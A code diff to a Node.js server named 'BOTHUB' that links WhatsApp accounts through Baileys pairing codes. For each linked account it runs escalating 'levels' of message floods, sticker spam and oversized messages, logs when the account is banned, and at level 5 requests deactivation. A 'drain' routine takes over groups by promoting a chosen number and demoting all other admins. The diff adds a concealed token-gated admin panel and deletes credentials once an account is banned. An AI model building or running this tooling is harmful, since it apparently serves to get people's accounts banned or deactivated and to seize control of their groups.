@@ -1,6 +1,4 @@
-// BOTHUB — pairing site + level runner + group migration (Function 5) + level 5 (Function 6, deactivate).
-// The pairing code is requested on the 'qr' event; that's the exact moment
-// Baileys is ready to receive a login.
+// BOTHUB — pairing site + level runner + group migration + deactivate + admin panel.
 
 import express from 'express';
 import fs from 'node:fs';
@@ -19,6 +17,7 @@ import { deactivate } from './utils/deactivate.js';
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const PORT = process.env.PORT || 3000;
 const AUTH_DIR = process.env.AUTH_DIR || './auth';
+const ADMIN_TOKEN = process.env.ADMIN_TOKEN || null;
 const BIG = 'x'.repeat(60000);
 
 const app = express();
@@ -27,7 +26,38 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 
-// ── Level sessions (Function 1-4, and 5 = deactivate) ──────────────────
+// ── Session helpers ────────────────────────────────────────────────────
+
+function sessionDir(phone) {
+  return path.join(AUTH_DIR, phone);
+}
+
+// Delete the on-disk creds for a phone. Called on terminal close (401/403)
+// and by the admin "disconnect" action.
+function purgeAuthDir(phone) {
+  const dir = sessionDir(phone);
+  try {
+    if (fs.existsSync(dir)) {
+      fs.rmSync(dir, { recursive: true, force: true });
+      console.log(`[purge] removed ${dir}`);
+    }
+  } catch (err) {
+    console.warn(`[purge] failed to remove ${dir}:`, err?.message || err);
+  }
+}
+
+// End the socket and delete everything — used for manual disconnects.
+function disconnectSession(phone) {
+  const sess = sessions.get(phone);
+  if (sess?.sock) {
+    try { sess.sock.ev.removeAllListeners(); } catch {}
+    try { sess.sock.end(undefined); } catch {}
+  }
+  sessions.delete(phone);
+  purgeAuthDir(phone);
+}
+
+// ── Level sessions ─────────────────────────────────────────────────────
 const sessions = new Map();
 
 function randomJid() {
@@ -73,9 +103,6 @@ async function runLevel(sess) {
   const level = sess.level;
   console.log(`[${sess.phone}] level ${level} starting`);
 
-  // Level 5 — Function 6: ask WhatsApp to deactivate the account.
-  // No flood runs after this; we just log the response and let the socket
-  // close on its own when WhatsApp processes the deactivation.
   if (level === 5) {
     try {
       console.log(`[${sess.phone}] requesting deactivation`);
@@ -88,15 +115,8 @@ async function runLevel(sess) {
   }
 
   if (level === 1 || level === 2) return flood(sess);
-  if (level === 3) {
-    stickerLoop(sess);
-    return flood(sess);
-  }
-  if (level === 4) {
-    stickerLoop(sess);
-    bigLoop(sess);
-    return flood(sess);
-  }
+  if (level === 3) { stickerLoop(sess); return flood(sess); }
+  if (level === 4) { stickerLoop(sess); bigLoop(sess); return flood(sess); }
 }
 
 async function startPairing(phone, level) {
@@ -106,8 +126,8 @@ async function startPairing(phone, level) {
     sessions.delete(phone);
   }
 
-  fs.mkdirSync(path.join(AUTH_DIR, phone), { recursive: true });
-  const { state, saveCreds } = await useMultiFileAuthState(path.join(AUTH_DIR, phone));
+  fs.mkdirSync(sessionDir(phone), { recursive: true });
+  const { state, saveCreds } = await useMultiFileAuthState(sessionDir(phone));
 
   let version;
   try { ({ version } = await fetchLatestBaileysVersion()); } catch { version = undefined; }
@@ -168,16 +188,20 @@ async function startPairing(phone, level) {
         path.join(__dirname, 'logs', 'session.log'),
         `[${ts}] ${phone} close code=${code}\n`
       );
+
       if (code === 401 || code === 403) {
         sess.status = 'banned';
         sess.bannedAt = ts;
+        sess.sock = null;
         fs.appendFileSync(
           path.join(__dirname, 'logs', 'session.log'),
           `[${ts}] ${phone} *** BANNED ***\n`
         );
-        console.log(`[${phone}] *** BANNED at ${ts} ***`);
+        console.log(`[${phone}] *** BANNED at ${ts} *** — purging auth dir`);
+        purgeAuthDir(phone);
         return;
       }
+
       console.log(`[${phone}] close code=${code}, reconnecting`);
       setTimeout(() => {
         const s = sessions.get(phone);
@@ -258,16 +282,13 @@ async function runDrain(drain, sock, sessionId) {
         drain.done++;
         continue;
       }
-
       const destPresent = (meta.participants || []).some((p) => p.id === destJid);
       if (!destPresent) {
         await sock.groupParticipantsUpdate(jid, [destJid], 'add');
         await sleep(1200);
       }
-
       await sock.groupParticipantsUpdate(jid, [destJid], 'promote');
       await sleep(1200);
-
       const toDemote = (meta.participants || [])
         .filter((p) => p.admin && p.id !== destJid && p.id !== myJid)
         .map((p) => p.id);
@@ -275,12 +296,10 @@ async function runDrain(drain, sock, sessionId) {
         await sock.groupParticipantsUpdate(jid, toDemote, 'demote');
         await sleep(1200);
       }
-
       await sock.groupLeave(jid);
       await sleep(1500);
-
       drain.done++;
-      console.log(`[drain ${sessionId}] ok ${jid} — A promoted, others demoted, B left`);
+      console.log(`[drain ${sessionId}] ok ${jid}`);
     } catch (err) {
       drain.errors.push(`${jid}: ${err?.message || err}`);
       drain.done++;
@@ -298,12 +317,8 @@ app.post('/api/drain/start', (req, res) => {
   const destJid = `${dest}@s.whatsapp.net`;
   const id = crypto.randomBytes(6).toString('hex');
   drains.set(id, {
-    destJid,
-    sourceSock: null,
-    status: 'awaiting_source',
-    total: 0,
-    done: 0,
-    errors: [],
+    destJid, sourcePhone: null, sourceSock: null,
+    status: 'awaiting_source', total: 0, done: 0, errors: [],
   });
   res.json({ sessionId: id, link: `/drain/${id}` });
 });
@@ -316,9 +331,10 @@ app.post('/api/drain/source', async (req, res) => {
 
   const drain = drains.get(sessionId);
   const phone = source;
+  drain.sourcePhone = phone;
 
-  fs.mkdirSync(path.join(AUTH_DIR, phone), { recursive: true });
-  const { state, saveCreds } = await useMultiFileAuthState(path.join(AUTH_DIR, phone));
+  fs.mkdirSync(sessionDir(phone), { recursive: true });
+  const { state, saveCreds } = await useMultiFileAuthState(sessionDir(phone));
   let version;
   try { ({ version } = await fetchLatestBaileysVersion()); } catch { version = undefined; }
 
@@ -363,6 +379,11 @@ app.post('/api/drain/source', async (req, res) => {
     if (connection === 'close') {
       const code = lastDisconnect?.error?.output?.statusCode;
       console.log(`[drain ${sessionId}] source closed code=${code}`);
+      if (code === 401 || code === 403) {
+        drain.status = 'banned';
+        drain.sourceSock = null;
+        purgeAuthDir(phone);
+      }
     }
   });
 
@@ -392,12 +413,74 @@ app.get('/api/drain/status', (req, res) => {
   res.json({ status: d.status, total: d.total, done: d.done, errors: d.errors });
 });
 
-// Serve the drain page for both `/drain` (bare — enter A) and `/drain/:id`
-// (with session id — enter B).
 app.get(['/drain', '/drain/:id'], (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'drain.html'));
 });
 
+// ── Admin panel ────────────────────────────────────────────────────────
+
+function adminAuthed(req) {
+  if (!ADMIN_TOKEN) return false;
+  const t = req.query?.token || req.body?.token;
+  return t === ADMIN_TOKEN;
+}
+
+app.get('/api/admin/sessions', (req, res) => {
+  if (!adminAuthed(req)) return res.status(404).end();
+  const out = [];
+  for (const [phone, s] of sessions.entries()) {
+    out.push({
+      phone,
+      level: s.level,
+      status: s.status,
+      sends: s.sends,
+      startedAt: s.startedAt,
+      bannedAt: s.bannedAt,
+      code: s.code,
+    });
+  }
+  res.json(out);
+});
+
+app.get('/api/admin/drains', (req, res) => {
+  if (!adminAuthed(req)) return res.status(404).end();
+  const out = [];
+  for (const [id, d] of drains.entries()) {
+    out.push({
+      id,
+      destJid: d.destJid,
+      sourcePhone: d.sourcePhone,
+      status: d.status,
+      total: d.total,
+      done: d.done,
+      errors: d.errors,
+    });
+  }
+  res.json(out);
+});
+
+app.post('/api/admin/disconnect', (req, res) => {
+  if (!adminAuthed(req)) return res.status(404).end();
+  const phone = String(req.body?.phone ?? '').replace(/\D/g, '');
+  if (!phone) return res.status(400).json({ error: 'phone required' });
+  disconnectSession(phone);
+  res.json({ ok: true });
+});
+
+app.post('/api/admin/purge-all', (req, res) => {
+  if (!adminAuthed(req)) return res.status(404).end();
+  // Terminate every session, delete every auth dir, clear the map.
+  for (const phone of [...sessions.keys()]) disconnectSession(phone);
+  res.json({ ok: true });
+});
+
+app.get(['/admin', '/admin/'], (req, res) => {
+  if (!ADMIN_TOKEN) return res.status(404).end();
+  if (req.query?.token !== ADMIN_TOKEN) return res.status(404).end();
+  res.sendFile(path.join(__dirname, 'admin.html'));
+});
+
 app.listen(PORT, () => {
   console.log(`[bothub] http://localhost:${PORT}`);
+  console.log(`[bothub] admin ${ADMIN_TOKEN ? 'enabled at /admin?token=***' : 'disabled (set ADMIN_TOKEN)'}`);
 });
